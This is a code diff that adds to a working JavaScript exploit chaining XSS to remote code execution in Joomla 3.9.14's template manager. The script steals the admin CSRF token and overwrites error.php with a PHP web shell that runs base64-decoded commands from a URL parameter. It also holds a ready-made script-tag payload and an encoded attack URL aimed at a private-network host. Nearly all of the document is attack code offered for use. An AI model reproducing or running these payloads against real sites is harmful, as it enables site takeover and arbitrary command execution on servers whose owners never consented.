@@ -1,3 +1,7 @@
+/*
+	Exploit XSS to RCE in joomla 3.9.14, com_templates, template controller, less() function
+*/
+
 // Get csrf token
 var xhttp = new XMLHttpRequest();
 var response1 = "";
@@ -25,3 +29,40 @@ xhttp.setRequestHeader("Upgrade-Insecure-Requests", 1);
 xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 post = 'jform%5Bsource%5D=%3C%3Fphp%20system(base64_decode(%24_GET%5B\'cmd\'%5D))%3B%20%3F%3E&task=template.apply&' + token + '=1&jform%5Bextension_id%5D=506&jform%5Bfilename%5D=%2Ferror.php';
 xhttp.send(post);
+
+
+
+
+ /* 
+ 	Js payload
+ */
+// <script>
+// var xhttp = new XMLHttpRequest();
+// var response1 = "";
+// xhttp.onreadystatechange = function() {
+// 	if (this.readyState == 4 && this.status == 200) {
+// 		response1 = this.responseText;
+// 	}
+// };
+// xhttp.open("GET", "/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA", false);
+// xhttp.send();
+// var parser = new DOMParser();
+// var xmlDoc = parser.parseFromString(response1, 'text/html');
+// var token = xmlDoc.querySelector('#adminForm > input[type=hidden]:nth-child(3)').name;
+// xhttp = new XMLHttpRequest();
+// xhttp.withCredentials = true;
+// xhttp.open("POST", "/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA", true);
+// xhttp.setRequestHeader("Upgrade-Insecure-Requests", 1);
+// xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+// post = 'jform[source]=<?php system(base64_decode($_GET[\'cmd\'])); ?>&task=template.apply&' + token + '=1&jform[extension_id]=506&jform[filename]=/error.php';
+// xhttp.send(post);
+// </script>
+
+
+
+
+
+/* 
+	URL payload 
+*/
+// http://192.168.182.136:8081/administrator/?option=com_templates&task=template.less&id=506&file=JTNDc2NyaXB0JTNFJTBBdmFyJTIweGh0dHAlMjAlM0QlMjBuZXclMjBYTUxIdHRwUmVxdWVzdCgpJTNCJTBBdmFyJTIwcmVzcG9uc2UxJTIwJTNEJTIwJTIyJTIyJTNCJTBBeGh0dHAub25yZWFkeXN0YXRlY2hhbmdlJTIwJTNEJTIwZnVuY3Rpb24oKSUyMCU3QiUwQSUwOWlmJTIwKHRoaXMucmVhZHlTdGF0ZSUyMCUzRCUzRCUyMDQlMjAlMjYlMjYlMjB0aGlzLnN0YXR1cyUyMCUzRCUzRCUyMDIwMCklMjAlN0IlMEElMDklMDlyZXNwb25zZTElMjAlM0QlMjB0aGlzLnJlc3BvbnNlVGV4dCUzQiUwQSUwOSU3RCUwQSU3RCUzQiUwQXhodHRwLm9wZW4oJTIyR0VUJTIyJTJDJTIwJTIyJTJGYWRtaW5pc3RyYXRvciUyRmluZGV4LnBocCUzRm9wdGlvbiUzRGNvbV90ZW1wbGF0ZXMlMjZ2aWV3JTNEdGVtcGxhdGUlMjZpZCUzRDUwNiUyNmZpbGUlM0RMMlZ5Y205eUxuQm9jQSUyMiUyQyUyMGZhbHNlKSUzQiUwQXhodHRwLnNlbmQoKSUzQiUwQXZhciUyMHBhcnNlciUyMCUzRCUyMG5ldyUyMERPTVBhcnNlcigpJTNCJTBBdmFyJTIweG1sRG9jJTIwJTNEJTIwcGFyc2VyLnBhcnNlRnJvbVN0cmluZyhyZXNwb25zZTElMkMlMjAndGV4dCUyRmh0bWwnKSUzQiUwQXZhciUyMHRva2VuJTIwJTNEJTIweG1sRG9jLnF1ZXJ5U2VsZWN0b3IoJyUyM2FkbWluRm9ybSUyMCUzRSUyMGlucHV0JTVCdHlwZSUzRGhpZGRlbiU1RCUzQW50aC1jaGlsZCgzKScpLm5hbWUlM0IlMEF4aHR0cCUyMCUzRCUyMG5ldyUyMFhNTEh0dHBSZXF1ZXN0KCklM0IlMEF4aHR0cC53aXRoQ3JlZGVudGlhbHMlMjAlM0QlMjB0cnVlJTNCJTBBeGh0dHAub3BlbiglMjJQT1NUJTIyJTJDJTIwJTIyJTJGYWRtaW5pc3RyYXRvciUyRmluZGV4LnBocCUzRm9wdGlvbiUzRGNvbV90ZW1wbGF0ZXMlMjZ2aWV3JTNEdGVtcGxhdGUlMjZpZCUzRDUwNiUyNmZpbGUlM0RMMlZ5Y205eUxuQm9jQSUyMiUyQyUyMHRydWUpJTNCJTBBeGh0dHAuc2V0UmVxdWVzdEhlYWRlciglMjJVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJTIyJTJDJTIwMSklM0IlMEF4aHR0cC5zZXRSZXF1ZXN0SGVhZGVyKCUyMkNvbnRlbnQtVHlwZSUyMiUyQyUyMCUyMmFwcGxpY2F0aW9uJTJGeC13d3ctZm9ybS11cmxlbmNvZGVkJTIyKSUzQiUwQXBvc3QlMjAlM0QlMjAnamZvcm0lNUJzb3VyY2UlNUQlM0QlM0MlM0ZwaHAlMjBzeXN0ZW0oYmFzZTY0X2RlY29kZSglMjRfR0VUJTVCJTVDJ2NtZCU1QyclNUQpKSUzQiUyMCUzRiUzRSUyNnRhc2slM0R0ZW1wbGF0ZS5hcHBseSUyNiclMjAlMkIlMjB0b2tlbiUyMCUyQiUyMCclM0QxJTI2amZvcm0lNUJleHRlbnNpb25faWQlNUQlM0Q1MDYlMjZqZm9ybSU1QmZpbGVuYW1lJTVEJTNEJTJGZXJyb3IucGhwJyUzQiUwQXhodHRwLnNlbmQocG9zdCklM0IlMEElM0MlMkZzY3JpcHQlM0U%3D
